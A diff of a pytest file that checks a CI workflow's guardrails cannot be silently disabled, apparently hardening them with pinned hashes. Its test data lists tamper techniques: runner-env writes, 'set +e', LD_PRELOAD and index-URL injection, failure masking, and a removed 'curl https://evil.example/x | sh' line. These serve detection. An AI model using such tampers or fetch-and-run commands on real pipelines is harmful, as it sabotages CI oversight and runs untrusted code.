@@ -1,14 +1,19 @@
 """The guardrails stay switched on: strict xfail, the CI jobs, the local hooks.
 
 Each guardrail is configuration, and configuration can be deleted in the same
-change that would trip it. These tests fail when a guardrail is turned off, so
-removing one needs this file changed too, in plain sight of review.
+change that would trip it. The floor guard (scripts/floor_guard.py) pins every
+job and guard file exactly and checks the pinned values against rules; these
+tests prove it on the live tree and on every class of tamper planted in the
+real workflow. Removing a guardrail needs this file and the pins changed too,
+in plain sight of review.
 """
 
 from __future__ import annotations
 
 import configparser
-import re
+import json
+import shutil
+import sys
 import tomllib
 from pathlib import Path
 
@@ -16,215 +21,43 @@ import pytest
 import yaml
 
 ROOT = Path(__file__).resolve().parents[1]
+sys.path.insert(0, str(ROOT / "scripts"))
+
+import floor_guard as guard  # noqa: E402
+
+WORKFLOW = ROOT / ".github" / "workflows" / "floor.yml"
 
 
 def _workflow() -> dict:
-    return yaml.safe_load(
-        (ROOT / ".github" / "workflows" / "floor.yml").read_text(encoding="utf-8")
-    )
-
-
-def _strip_comments(run: str) -> str:
-    """Shell text without comment lines, so a needle kept in a comment does not count."""
-    return "\n".join(
-        line for line in run.splitlines() if not line.strip().startswith("#")
-    )
+    return yaml.safe_load(WORKFLOW.read_text(encoding="utf-8"))
 
 
 def _runs(job: dict) -> str:
-    return "\n".join(
-        _strip_comments(str(s.get("run", ""))) for s in job.get("steps", [])
+    return "\n".join(str(s.get("run", "")) for s in job.get("steps", []))
+
+
+# --- the live floor -----------------------------------------------------------
+
+
+def test_live_floor_matches_its_pins_and_rules() -> None:
+    assert guard.violations(ROOT) == []
+
+
+def test_pins_cover_every_job_and_guard_file() -> None:
+    pins = json.loads(
+        (ROOT / ".github" / "floor-pins.json").read_text(encoding="utf-8")
     )
-
-
-# Jobs whose failure must fail the floor, and the only `if:` each may carry.
-GUARDRAIL_JOBS = {
-    "secrets": None,
-    "leak-denylist": "github.event_name == 'pull_request' || github.event_name == 'push'",
-    "kat-lint": None,
-    "tests": None,
-    "lint": None,
-    "authorship": None,
-}
-ALLOWED_STEP_IFS = {"github.event_name == 'pull_request'"}
-# What a guardrail job is allowed to be. Anything else can change the check.
-ALLOWED_JOB_KEYS = frozenset(
-    {"name", "timeout-minutes", "runs-on", "if", "steps", "strategy"}
-)
-ALLOWED_STEP_KEYS = frozenset(
-    {"name", "uses", "with", "env", "run", "if", "shell", "working-directory"}
-)
-ALLOWED_ACTIONS = frozenset(
-    {
-        "actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683",
-        "actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065",
-        "gitleaks/gitleaks-action@e0c47f4f8be36e29cdc102c57e68cb5cbf0e8d1e",
-    }
-)
-ALLOWED_COMMANDS = frozenset(
-    {
-        "git",
-        "python",
-        "python3",
-        "pytest",
-        "pip",
-        "ruff",
-        "echo",
-        "printf",
-        "cp",
-        "exit",
-        "[",
-    }
-)
-ALLOWED_ASSIGN = frozenset({"ZERO", "BASE", "INSTALLED", "V", "C"})
-ALLOWED_ENV = {
-    "secrets": {"GITHUB_TOKEN": "${{ secrets.GITHUB_TOKEN }}"},
-    "leak-denylist": {
-        "LEAK_DENYLIST": "${{ secrets.LEAK_DENYLIST }}",
-        "EVENT_NAME": "${{ github.event_name }}",
-        "PUSH_BEFORE": "${{ github.event.before }}",
-        "PR_TITLE": "${{ github.event.pull_request.title }}",
-        "PR_BODY": "${{ github.event.pull_request.body }}",
-    },
-    "tests": {
-        "AEGIS_ATOMS_ROOT": "${{ github.workspace }}/aegis-atoms",
-        "ISOLATION_LAYER_ROOT": "${{ github.workspace }}/isolation-layer",
-    },
-}
-_ERREXIT = re.compile(r"(?:^|\s)-[A-Za-z]*e[A-Za-z]*(?:\s|$)")
-_BYPASS = re.compile(r"\|\|\s*(true|:|exit\s+0)(\s|$)|\bexit\s+0\b|\bset\s+\+e\b")
-_SCRIPT = re.compile(r"(?<![\w./:-])((?:[\w.-]+/)+[\w.-]+\.(?:py|sh))\b")
-
-
-def _shell_ok(shell: object) -> bool:
-    return shell is None or bool(_ERREXIT.search(str(shell)))
-
-
-def _first_command(line: str) -> str | None:
-    text = line.strip()
-    if not text or text[0] in {"'", '"', "|", ")", "\\"}:
-        return None
-    head, _, rest = text.partition(" ")
-    if head in {"fi", "then", "else", "do", "done"}:
-        return None
-    if head == "elif":
-        text = rest.strip()
-    elif head == "if":
-        text = rest.strip()
-    if re.match(r"^[A-Za-z_][A-Za-z0-9_]*=", text):
-        return "assign:" + text.split("=", 1)[0]
-    token = text.split(None, 1)[0] if text else ""
-    return token or None
-
-
-def _run_fault(run: str, script_root: Path) -> str | None:
-    if "${{" in run:
-        return "expression"
-    if "GITHUB_ENV" in run or "GITHUB_PATH" in run:
-        return "env-write"
-    if _BYPASS.search(run):
-        return "neutralizer"
-    for line in run.splitlines():
-        for piece in line.split("||"):
-            token = _first_command(piece)
-            if token is None:
-                continue
-            if token.startswith("assign:"):
-                if token.split(":", 1)[1] not in ALLOWED_ASSIGN:
-                    return "assignment"
-                continue
-            if token not in ALLOWED_COMMANDS:
-                return "command"
-            if token in {"python", "python3"} and re.search(r"(^|\s)-c(\s|$)", piece):
-                return "computed-exit"
-            if token == "exit":
-                parts = piece.split()
-                if len(parts) < 2 or parts[1] not in {"1", "3"}:
-                    return "neutralizer"
-        if "||" in line:
-            for piece in line.split("||"):
-                token = _first_command(piece)
-                if token not in {None, "[", "test"}:
-                    return "neutralizer"
-    for rel in _SCRIPT.findall(run):
-        path = script_root / rel
-        if not path.is_file():
-            continue
-        body = path.read_text(encoding="utf-8", errors="replace")
-        if "GITHUB_ENV" in body or "GITHUB_PATH" in body or _BYPASS.search(body):
-            return "script"
-    return None
-
-
-def _env_fault(job_name: str | None, env: dict) -> str | None:
-    if job_name is None:
-        specs = list(ALLOWED_ENV.values())
-    else:
-        specs = [ALLOWED_ENV.get(job_name, {})]
-    for key, value in env.items():
-        if not any(spec.get(key) == value for spec in specs):
-            return "env"
-    return None
-
-
-def _step_fault(
-    step: dict, job_name: str | None = None, script_root: Path = ROOT
-) -> str | None:
-    """Why this guardrail step is outside the allowlist, or None."""
-    extra = set(step) - ALLOWED_STEP_KEYS
-    if extra:
-        return "step-key"
-    if step.get("continue-on-error"):
-        return "continue-on-error"
-    if step.get("if") not in (None, *ALLOWED_STEP_IFS):
-        return f"if: {step.get('if')}"
-    if not _shell_ok(step.get("shell")):
-        return "shell"
-    env_fault = _env_fault(job_name, step.get("env") or {})
-    if env_fault:
-        return env_fault
-    uses = step.get("uses")
-    if uses is not None and uses not in ALLOWED_ACTIONS:
-        return "action"
-    run = _strip_comments(str(step.get("run", "")))
-    if run.strip():
-        return _run_fault(run, script_root)
-    return None
-
-
-def guardrail_violations(wf: dict, script_root: Path = ROOT) -> list[str]:
-    """Every allowlist miss in the guardrail jobs, including workflow scope."""
-    found: list[str] = []
-    if wf.get("env"):
-        found.append("workflow-env")
-    defaults = ((wf.get("defaults") or {}).get("run") or {}).get("shell")
-    if not _shell_ok(defaults):
-        found.append("workflow-shell")
-    jobs = wf.get("jobs") or {}
-    names = [(key, (job.get("name") or key)) for key, job in jobs.items()]
-    if len({name for _, name in names}) != len(names):
-        found.append("job-name")
-    guard_names = {
-        key: (jobs[key].get("name") or key) for key in GUARDRAIL_JOBS if key in jobs
-    }
-    for key, name in names:
-        for guard, real in guard_names.items():
-            if key != guard and name in {guard, real}:
-                found.append("job-name")
-    for name, allowed_if in GUARDRAIL_JOBS.items():
-        job = jobs.get(name)
-        if job is None:
-            found.append(f"missing:{name}")
-            continue
-        if set(job) - ALLOWED_JOB_KEYS:
-            found.append(f"job-key:{name}")
-        if job.get("if") != allowed_if:
-            found.append(f"if:{name}")
-        for step in job.get("steps", []):
-            fault = _step_fault(step, name, script_root)
-            if fault:
-                found.append(f"{name}:{fault}")
-    return found
+    assert set(pins["jobs"]) == set(_workflow()["jobs"])
+    for rel in (
+        "scripts/floor_guard.py",
+        "scripts/kat_lint.py",
+        "scripts/leak_denylist_scan.py",
+        "tests/test_floor_config.py",
+        "requirements-ci.lock",
+        "pytest.ini",
+        ".github/workflows/floor.yml",
+    ):
+        assert rel in pins["files"], rel
 
 
 def test_pytest_ini_keeps_strict_xfail_and_syntax_warning_errors() -> None:
@@ -233,13 +66,10 @@ def test_pytest_ini_keeps_strict_xfail_and_syntax_warning_errors() -> None:
     assert cfg.get("pytest", "xfail_strict").strip().lower() == "true"
     filters = cfg.get("pytest", "filterwarnings").split()
     assert "error::SyntaxWarning" in filters
-    # Later filters win, so nothing after the error filter may relax it.
     for f in filters[filters.index("error::SyntaxWarning") + 1 :]:
         action, _, rest = f.partition("::")
         category = rest.split(":")[0]
         assert action == "error" or category not in ("", "Warning", "SyntaxWarning"), f
-    # addopts can switch off strict xfail (--runxfail, -o) or warnings
-    # (-p no:warnings, -W) without touching the lines above.
     assert not cfg.has_option("pytest", "addopts"), cfg.get("pytest", "addopts")
 
 
@@ -249,9 +79,10 @@ def test_pytest_ini_keeps_strict_xfail_and_syntax_warning_errors() -> None:
         ("secrets", "gitleaks/gitleaks-action@"),
         ("leak-denylist", "--ci --base"),
         ("leak-denylist", '--text "pull request title and body"'),
-        ("leak-denylist", "origin/main:scripts/leak_denylist_scan.py"),
-        ("kat-lint", "scripts/kat_lint.py"),
-        ("tests", "pytest"),
+        ("leak-denylist", "git show origin/main:scripts/leak_denylist_scan.py"),
+        ("kat-lint", "python scripts/kat_lint.py"),
+        ("tests", "pytest -q"),
+        ("floor-guard", 'git show "$BASE:scripts/floor_guard.py"'),
     ],
 )
 def test_floor_workflow_keeps_guardrail_jobs(job: str, needle: str) -> None:
@@ -275,6 +106,12 @@ def test_leak_job_reads_the_denylist_secret() -> None:
         assert env.get("LEAK_DENYLIST") == "${{ secrets.LEAK_DENYLIST }}"
 
 
+def test_leak_job_fails_closed_without_a_base_scanner() -> None:
+    run = _runs(_workflow()["jobs"]["leak-denylist"])
+    assert "refusing to run this change's copy" in run
+    assert "cp scripts/leak_denylist_scan.py" not in run
+
+
 def test_pre_commit_keeps_local_guardrail_hooks() -> None:
     cfg = yaml.safe_load((ROOT / ".pre-commit-config.yaml").read_text(encoding="utf-8"))
     hooks = {h["id"]: h for repo in cfg["repos"] for h in repo.get("hooks", [])}
@@ -293,136 +130,545 @@ def test_gitleaks_config_keeps_default_and_custom_rules() -> None:
 
 
 def test_pull_request_trigger_reruns_on_title_or_body_edit() -> None:
-    # PyYAML reads the bare key "on" as boolean True.
     wf = _workflow()
     triggers = wf.get("on", wf.get(True))
-    pr = triggers["pull_request"] or {}
-    types = set(pr.get("types", []))
-    # Without "edited", a title or body changed after the last push is never
-    # rescanned, so the leak check could pass on text it never read.
+    types = set((triggers["pull_request"] or {}).get("types", []))
     assert {"opened", "synchronize", "reopened", "edited"} <= types
-
-
-def test_guardrail_jobs_cannot_be_skipped_or_soft_failed() -> None:
-    wf = _workflow()
-    jobs = wf["jobs"]
-    assert "PYTEST_ADDOPTS" not in (wf.get("env") or {})
-    for name, allowed_if in GUARDRAIL_JOBS.items():
-        job = jobs[name]
-        assert job.get("if") == allowed_if, (name, job.get("if"))
-        assert not job.get("continue-on-error"), name
-        assert "PYTEST_ADDOPTS" not in (job.get("env") or {}), name
-        for s in job.get("steps", []):
-            label = (name, s.get("name") or s.get("uses") or s.get("run"))
-            fault = _step_fault(s)
-            assert fault is None, (label, fault)
-
-
-def test_guardrail_commands_run_as_written() -> None:
-    jobs = _workflow()["jobs"]
-    pytest_runs = [
-        _strip_comments(str(s.get("run", ""))).strip()
-        for s in jobs["tests"]["steps"]
-        if "pytest" in str(s.get("run", ""))
-        and "pip install" not in str(s.get("run", ""))
-    ]
-    assert pytest_runs == ["pytest -q"], pytest_runs
-    assert "python scripts/kat_lint.py" in _runs(jobs["kat-lint"]).splitlines()
-    leak = _runs(jobs["leak-denylist"])
-    load = 'git show origin/main:scripts/leak_denylist_scan.py > "$RUNNER_TEMP/leak_scan.py"'
-    assert load in leak
-    assert 'python "$RUNNER_TEMP/leak_scan.py" --ci --base "$BASE" --head HEAD' in leak
-    assert '| python "$RUNNER_TEMP/leak_scan.py" --text' in leak
-
-
-@pytest.mark.parametrize(
-    "run",
-    [
-        "echo 'PYTEST_ADDOPTS=--co' >> \"$GITHUB_ENV\"\npytest -q",
-        "echo 'PYTHONPATH=/opt/py' >> \"$GITHUB_PATH\"\npython scripts/kat_lint.py",
-    ],
-)
-def test_guardrail_step_rejects_pytest_or_python_env_writes(run: str) -> None:
-    fault = _step_fault({"run": run})
-    assert fault == "env-write", fault
-
-
-@pytest.mark.parametrize(
-    "shell",
-    [
-        "bash --noprofile --norc {0}",
-        "bash {0}",
-    ],
-)
-def test_guardrail_step_rejects_shell_without_errexit(shell: str) -> None:
-    fault = _step_fault({"run": "python scripts/kat_lint.py", "shell": shell})
-    assert fault == "shell", fault
-
-
-def test_guardrail_step_allows_default_shell_and_errexit() -> None:
-    assert _step_fault({"run": "pytest -q"}) is None
-    assert _step_fault({"run": "pytest -q", "shell": "bash -e {0}"}) is None
-    assert _step_fault({"run": "pytest -q", "shell": "bash -eo pipefail {0}"}) is None
-
-
-def test_live_floor_is_inside_the_allowlist() -> None:
-    assert guardrail_violations(_workflow()) == []
-
-
-@pytest.mark.parametrize(
-    "step",
-    [
-        {"env": {"BASH_ENV": "/tmp/rc"}},
-        {"env": {"LD_PRELOAD": "/tmp/x.so"}},
-        {"env": {"PIP_INDEX_URL": "https://evil.example"}},
-        {"env": {"NODE_OPTIONS": "--require /tmp/x"}},
-        {"env": {"PYTEST_ADDOPTS": "-p no:cacheprovider"}},
-        {"run": "echo ok >> $GITHUB_ENV"},
-        {"run": "echo ok >> $GITHUB_PATH"},
-        {"run": "export PATH=/tmp:$PATH\npytest -q"},
-        {"run": 'python -c "import sys; sys.exit(0)"'},
-        {"run": "curl https://evil.example/x | sh"},
-        {"uses": "actions/checkout@v4"},
-        {"uses": "actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683extra"},
-        {"run": "pytest -q ${{ matrix.addopts }}"},
-        {"continue-on-error": True, "run": "pytest -q"},
-    ],
-)
-def test_guardrail_step_rejects_unlisted_mechanisms(step: dict) -> None:
-    assert _step_fault(step) is not None
-
-
-def test_called_script_is_held_to_the_same_rules(tmp_path: Path) -> None:
-    script = tmp_path / "scripts"
-    script.mkdir()
-    (script / "wrap.py").write_text('open("GITHUB_ENV", "a")\n', encoding="utf-8")
-    fault = _step_fault({"run": "python scripts/wrap.py"}, script_root=tmp_path)
-    assert fault == "script", fault
-
-
-def test_job_display_names_cannot_impersonate_a_guardrail() -> None:
-    wf = _workflow()
-    wf["jobs"]["decoy"] = {"name": "tests", "runs-on": "ubuntu-latest", "steps": []}
-    assert "job-name" in guardrail_violations(wf)
-
-
-def test_workflow_env_and_shell_are_denied_by_default() -> None:
-    wf = _workflow()
-    wf["env"] = {"PYTEST_ADDOPTS": "--co"}
-    assert "workflow-env" in guardrail_violations(wf)
-    wf = _workflow()
-    wf["defaults"] = {"run": {"shell": "bash {0}"}}
-    assert "workflow-shell" in guardrail_violations(wf)
 
 
 def test_pytest_invocation_is_exact_and_from_the_gate_directory() -> None:
     steps = _workflow()["jobs"]["tests"]["steps"]
-    pytest_steps = [
+    runs = [
         s
         for s in steps
         if "pytest" in str(s.get("run", ""))
         and "pip install" not in str(s.get("run", ""))
     ]
-    assert len(pytest_steps) == 1
-    assert _strip_comments(str(pytest_steps[0]["run"])).strip() == "pytest -q"
-    assert pytest_steps[0].get("working-directory") == "capability-gate"
+    assert len(runs) == 1
+    assert str(runs[0]["run"]).strip() == "pytest -q"
+    assert runs[0].get("working-directory") == "capability-gate"
+
+
+def test_installs_use_only_the_hash_locked_file() -> None:
+    lock = (ROOT / "requirements-ci.lock").read_text(encoding="utf-8")
+    pinned = [line for line in lock.splitlines() if "==" in line]
+    assert pinned and lock.count("--hash=sha256:") >= len(pinned)
+    installs = 0
+    for name, job in _workflow()["jobs"].items():
+        for step in job.get("steps", []):
+            run = str(step.get("run", "")).strip()
+            if "pip" in run:
+                installs += 1
+                assert run.replace('"', "") in guard.LOCKED_INSTALLS, (name, run)
+    assert installs >= 3
+
+
+# --- every tamper class, planted in the real workflow (T8) ---------------------
+
+KAT = "      - run: python scripts/kat_lint.py\n"
+RUFF = "      - run: ruff check .\n"
+PYTEST = "        run: pytest -q\n"
+
+
+def _step(run: str, extra: str = "") -> str:
+    return (
+        KAT
+        + extra
+        + "      - run: |\n"
+        + "".join(f"          {line}\n" for line in run.splitlines())
+    )
+
+
+TAMPERS = [
+    # T1: exact pins (values a rule cannot judge)
+    (
+        "T1 runner",
+        (
+            "    name: tests (known-answer tests call the gate)\n    timeout-minutes: 10\n    runs-on: ubuntu-latest\n",
+            "    name: tests (known-answer tests call the gate)\n    timeout-minutes: 10\n    runs-on: self-hosted\n",
+        ),
+        "pin: job kat-lint changed",
+        True,
+    ),
+    (
+        "T1 timeout",
+        (
+            "    name: tests (known-answer tests call the gate)\n    timeout-minutes: 10\n",
+            "    name: tests (known-answer tests call the gate)\n    timeout-minutes: 1\n",
+        ),
+        "pin: job kat-lint changed",
+        True,
+    ),
+    (
+        "T1 matrix",
+        ('python: ["3.11", "3.12"]', 'python: ["3.12"]'),
+        "pin: job tests changed",
+        True,
+    ),
+    (
+        "T1 run text",
+        (KAT, "      - run: python scripts/kat_lint.py --root .\n"),
+        "pin: job kat-lint changed",
+        True,
+    ),
+    (
+        "T1 working directory",
+        (
+            PYTEST,
+            PYTEST.replace("run:", "working-directory: aegis-atoms\n        run:"),
+        ),
+        "working directory",
+        False,
+    ),
+    (
+        "T1 concurrency",
+        ("  cancel-in-progress: true\n", "  cancel-in-progress: false\n"),
+        "pin: workflow settings changed",
+        True,
+    ),
+    (
+        "T1 permissions",
+        ("permissions:\n  contents: read\n", "permissions:\n  contents: write\n"),
+        "permissions beyond contents: read",
+        False,
+    ),
+    (
+        "T1 expression in run",
+        (PYTEST, "        run: pytest -q ${{ github.event.pull_request.title }}\n"),
+        "expression interpolated",
+        False,
+    ),
+    (
+        "T1 unparseable shell",
+        (KAT, _step('echo "unterminated')),
+        "does not parse",
+        False,
+    ),
+    (
+        "T1 unknown command",
+        (KAT, _step("make test")),
+        "command make is not allowlisted",
+        False,
+    ),
+    # T2: stop-on-error
+    (
+        "T2 shell without -e",
+        (KAT, KAT + "        shell: bash {0}\n"),
+        "shell without stop-on-error",
+        False,
+    ),
+    (
+        "T2 shell -e then +e",
+        (KAT, KAT + "        shell: bash -e +e {0}\n"),
+        "shell without stop-on-error",
+        False,
+    ),
+    (
+        "T2 shell +e first",
+        (KAT, KAT + "        shell: bash +e -e {0}\n"),
+        "shell without stop-on-error",
+        False,
+    ),
+    (
+        "T2 set +e",
+        (KAT, _step("set +e\npython scripts/kat_lint.py")),
+        "set is not allowed",
+        False,
+    ),
+    (
+        "T2 set +o errexit",
+        (KAT, _step("set +o errexit\npython scripts/kat_lint.py")),
+        "set is not allowed",
+        False,
+    ),
+    (
+        "T2 set -e then +e",
+        (KAT, _step("set -e +e\npython scripts/kat_lint.py")),
+        "set is not allowed",
+        False,
+    ),
+    (
+        "T2 quoted set",
+        (KAT, _step("'set' +e\npython scripts/kat_lint.py")),
+        "set is not allowed",
+        False,
+    ),
+    (
+        "T2 built-up set",
+        (KAT, _step('S=se; "${S}t" +e\npython scripts/kat_lint.py')),
+        "constructed command",
+        False,
+    ),
+    (
+        "T2 eval",
+        (KAT, _step('eval "set +e"\npython scripts/kat_lint.py')),
+        "eval is not allowed",
+        False,
+    ),
+    (
+        "T2 shopt",
+        (KAT, _step("shopt -u -o errexit\npython scripts/kat_lint.py")),
+        "shopt is not allowed",
+        False,
+    ),
+    (
+        "T2 workflow default shell",
+        ("permissions:\n", "defaults:\n  run:\n    shell: bash {0}\npermissions:\n"),
+        "default shell without stop-on-error",
+        False,
+    ),
+    (
+        "T2 negated statement",
+        (KAT, _step("! python scripts/kat_lint.py")),
+        "negated",
+        False,
+    ),
+    # T3: runner files by any spelling, any position
+    (
+        "T3 GITHUB_ENV",
+        (KAT, _step('echo "A=1" >> "$GITHUB_ENV"')),
+        "runner environment",
+        False,
+    ),
+    (
+        "T3 braces GITHUB_PATH",
+        (KAT, _step('echo /tmp >> "${GITHUB_PATH}"')),
+        "runner environment",
+        False,
+    ),
+    (
+        "T3 split name",
+        (KAT, _step('echo A=1 >> "$GITH""UB_ENV"')),
+        "runner environment",
+        False,
+    ),
+    (
+        "T3 indirect name",
+        (KAT, _step('N=GITHUB_; echo A=1 >> "${!N}ENV"')),
+        "redirect target",
+        False,
+    ),
+    (
+        "T3 constructed variable",
+        (KAT, _step('X=GI; Y=THUB_OUTPUT; F="$X$Y"; echo a >> "${!F}"')),
+        "redirect target",
+        False,
+    ),
+    (
+        "T3 file commands dir",
+        (
+            KAT,
+            _step("echo A=1 >> $HOME/work/_temp/_runner_file_commands/set_env_1"),
+        ),
+        "runner environment",
+        False,
+    ),
+    (
+        "T3 redirect after &&",
+        (KAT, _step("python scripts/kat_lint.py && echo x > pytest.ini")),
+        "redirect target",
+        False,
+    ),
+    (
+        "T3 redirect in substitution",
+        (KAT, _step('echo "$(echo x > conftest.py)"')),
+        "redirect target",
+        False,
+    ),
+    (
+        "T3 tee",
+        (KAT, _step("python scripts/kat_lint.py | tee out.txt")),
+        "tee is not allowed",
+        False,
+    ),
+    (
+        "T3 env prefix",
+        (KAT, _step("BASH_ENV=/tmp/rc python scripts/kat_lint.py")),
+        "assignment to BASH_ENV",
+        False,
+    ),
+    (
+        "T3 step env",
+        (KAT, KAT + "        env:\n          LD_PRELOAD: /tmp/x.so\n"),
+        "env sets LD_PRELOAD",
+        False,
+    ),
+    (
+        "T3 job env",
+        (
+            "    name: tests (known-answer tests call the gate)\n",
+            "    name: tests (known-answer tests call the gate)\n    env:\n      PYTHONPATH: /tmp\n",
+        ),
+        "env at job level",
+        False,
+    ),
+    (
+        "T3 workflow env",
+        ("permissions:\n", "env:\n  PYTEST_ADDOPTS: --co\npermissions:\n"),
+        "env at workflow level",
+        False,
+    ),
+    (
+        "T3 in if condition",
+        (KAT, _step('if echo A >> "$GITHUB_ENV"; then python scripts/kat_lint.py; fi')),
+        "runner environment",
+        False,
+    ),
+    # T4: installs
+    (
+        "T4 free pip",
+        (KAT, _step("pip install requests\npython scripts/kat_lint.py")),
+        "pip is not allowed",
+        False,
+    ),
+    (
+        "T4 python -m pip unlocked",
+        (KAT, _step("python -m pip install requests")),
+        "install outside the hash-locked",
+        False,
+    ),
+    (
+        "T4 index override",
+        (
+            KAT,
+            _step(
+                "python -m pip install --require-hashes --no-deps -r requirements-ci.lock --index-url https://example.invalid/simple"
+            ),
+        ),
+        "install outside the hash-locked",
+        False,
+    ),
+    (
+        "T4 index env",
+        (
+            KAT,
+            KAT
+            + "        env:\n          PIP_INDEX_URL: https://example.invalid/simple\n",
+        ),
+        "env sets PIP_INDEX_URL",
+        False,
+    ),
+    ("T4 uv", (KAT, _step("uv pip install requests")), "uv is not allowed", False),
+    # T5: check names
+    (
+        "T5 case-folded name",
+        (
+            "  authorship:\n",
+            "  decoy:\n    name: Tests (Known-Answer Tests Call The Gate)\n    runs-on: ubuntu-latest\n    timeout-minutes: 5\n    steps:\n      - run: echo hi\n  authorship:\n",
+        ),
+        "produced by more than one job",
+        False,
+    ),
+    (
+        "T5 matrix-expanded name",
+        (
+            "  authorship:\n",
+            '  decoy:\n    name: tests\n    runs-on: ubuntu-latest\n    timeout-minutes: 5\n    strategy:\n      matrix:\n        python: ["3.12"]\n    steps:\n      - run: echo hi\n  authorship:\n',
+        ),
+        "produced by more than one job",
+        False,
+    ),
+    (
+        "T5 name equal only after matrix expansion",
+        (
+            "  authorship:\n",
+            "  decoy:\n    name: tests (3.12)\n    runs-on: ubuntu-latest\n    timeout-minutes: 5\n    steps:\n      - run: echo hi\n  authorship:\n",
+        ),
+        "produced by more than one job",
+        False,
+    ),
+    # T6: checkout inputs and guard files
+    (
+        "T6 checkout ref",
+        (
+            '      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2\n        with:\n          persist-credentials: false\n      - uses: actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065 # v5.6.0\n        with:\n          python-version: "3.12"\n      - run: python scripts/kat_lint.py\n',
+            '      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2\n        with:\n          persist-credentials: false\n          ref: main\n      - uses: actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065 # v5.6.0\n        with:\n          python-version: "3.12"\n      - run: python scripts/kat_lint.py\n',
+        ),
+        "checkout inputs change",
+        False,
+    ),
+    (
+        "T6 git checkout guard file",
+        (KAT, _step("git checkout HEAD~1 -- pytest.ini")),
+        "can change the tree",
+        False,
+    ),
+    (
+        "T6 cp over conftest",
+        (KAT, _step("cp /tmp/x tests/conftest.py")),
+        "cp to a non-workspace path",
+        False,
+    ),
+    (
+        "T6 unpinned action",
+        (KAT, KAT + "      - uses: actions/checkout@v4\n"),
+        "is not allowlisted",
+        False,
+    ),
+    (
+        "T6 continue-on-error",
+        (KAT, KAT + "        continue-on-error: true\n"),
+        "keys ['continue-on-error']",
+        False,
+    ),
+    (
+        "T6 job permissions",
+        (
+            "    name: tests (known-answer tests call the gate)\n",
+            "    name: tests (known-answer tests call the gate)\n    permissions:\n      contents: write\n",
+        ),
+        "permissions beyond contents: read",
+        False,
+    ),
+    (
+        "T6 temp path escape",
+        (KAT, _step('cp /tmp/x "$RUNNER_TEMP/../work/capability-gate/pytest.ini"')),
+        "cp to a non-workspace path",
+        False,
+    ),
+    # T7: lint cannot be made non-failing
+    (
+        "T7 ruff exit-zero",
+        (RUFF, "      - run: ruff check --exit-zero .\n"),
+        "lint made non-failing",
+        False,
+    ),
+    (
+        "T7 masked by || true",
+        (RUFF, "      - run: ruff check . || true\n"),
+        "failure masked",
+        False,
+    ),
+    (
+        "T7 masked by || exit 0",
+        (RUFF, "      - run: ruff check . || exit 0\n"),
+        "failure masked",
+        False,
+    ),
+    (
+        "T7 masked by || echo",
+        (RUFF, "      - run: ruff check . || echo ignored\n"),
+        "failure masked",
+        False,
+    ),
+    ("T7 exit 0", (KAT, _step("exit 0")), "exit with a success code", False),
+    (
+        "T7 python -c",
+        (KAT, _step('python -c "print(1)"')),
+        "python runs code from the command line",
+        False,
+    ),
+]
+
+
+def _copy_tree(tmp: Path) -> Path:
+    root = tmp / "repo"
+    for rel in guard.guard_files(ROOT) + [str(guard.PINS.as_posix())]:
+        dest = root / rel
+        dest.parent.mkdir(parents=True, exist_ok=True)
+        shutil.copyfile(ROOT / rel, dest)
+    return root
+
+
+@pytest.mark.parametrize(
+    ("label", "edit", "expect", "pin_only"), TAMPERS, ids=[t[0] for t in TAMPERS]
+)
+def test_each_tamper_planted_in_the_real_workflow_turns_the_floor_red(
+    tmp_path: Path, label: str, edit: tuple[str, str], expect: str, pin_only: bool
+) -> None:
+    root = _copy_tree(tmp_path)
+    wf = root / ".github" / "workflows" / "floor.yml"
+    text = wf.read_text(encoding="utf-8")
+    old, new = edit
+    assert text.count(old) >= 1, label
+    wf.write_text(text.replace(old, new, 1), encoding="utf-8")
+    # Against the committed pins: the pin catches every change.
+    found = guard.violations(root)
+    assert any(f.startswith("pin:") for f in found), (label, found)
+    if pin_only:
+        assert expect in found, (label, found)
+    # With the pins regenerated, as an attacker would: the rules still catch it,
+    # except for values only an exact pin can judge.
+    (root / guard.PINS).write_text(
+        json.dumps(guard.compute_pins(root)), encoding="utf-8"
+    )
+    found = guard.violations(root)
+    if pin_only:
+        assert found == [], (label, found)
+    else:
+        assert any(expect in f for f in found), (label, found)
+
+
+def test_a_called_script_is_pinned(tmp_path: Path) -> None:
+    root = _copy_tree(tmp_path)
+    script = root / "scripts" / "kat_lint.py"
+    script.write_text(
+        script.read_text(encoding="utf-8") + "\nimport sys; sys.exit(0)\n",
+        encoding="utf-8",
+    )
+    assert "pin: file scripts/kat_lint.py changed" in guard.violations(root)
+
+
+def test_an_added_conftest_or_pytest_config_is_caught(tmp_path: Path) -> None:
+    root = _copy_tree(tmp_path)
+    (root / "tests" / "conftest.py").write_text(
+        "collect_ignore_glob = ['*']\n", encoding="utf-8"
+    )
+    (root / "pyproject.toml").write_text(
+        "[tool.pytest.ini_options]\naddopts = '--co'\n", encoding="utf-8"
+    )
+    found = guard.violations(root)
+    assert "pin: file tests/conftest.py added" in found
+    assert "pin: file pyproject.toml added" in found
+
+
+def test_a_changed_lock_file_is_caught(tmp_path: Path) -> None:
+    root = _copy_tree(tmp_path)
+    lock = root / "requirements-ci.lock"
+    lock.write_text(
+        lock.read_text(encoding="utf-8") + "evil==1.0 --hash=sha256:" + "0" * 64 + "\n",
+        encoding="utf-8",
+    )
+    assert "pin: file requirements-ci.lock changed" in guard.violations(root)
+
+
+def test_a_deleted_guard_job_is_caught(tmp_path: Path) -> None:
+    root = _copy_tree(tmp_path)
+    wf = root / ".github" / "workflows" / "floor.yml"
+    data = yaml.safe_load(wf.read_text(encoding="utf-8"))
+    del data["jobs"]["kat-lint"]
+    wf.write_text(yaml.safe_dump(data, sort_keys=False), encoding="utf-8")
+    assert "pin: job kat-lint removed" in guard.violations(root)
+
+
+def test_a_missing_pin_file_fails_closed(tmp_path: Path) -> None:
+    root = _copy_tree(tmp_path)
+    (root / guard.PINS).unlink()
+    assert guard.violations(root) == ["pin: .github/floor-pins.json is missing"]
+
+
+def test_another_workflow_cannot_shadow_a_check_name(tmp_path: Path) -> None:
+    root = _copy_tree(tmp_path)
+    (root / ".github" / "workflows" / "decoy.yml").write_text(
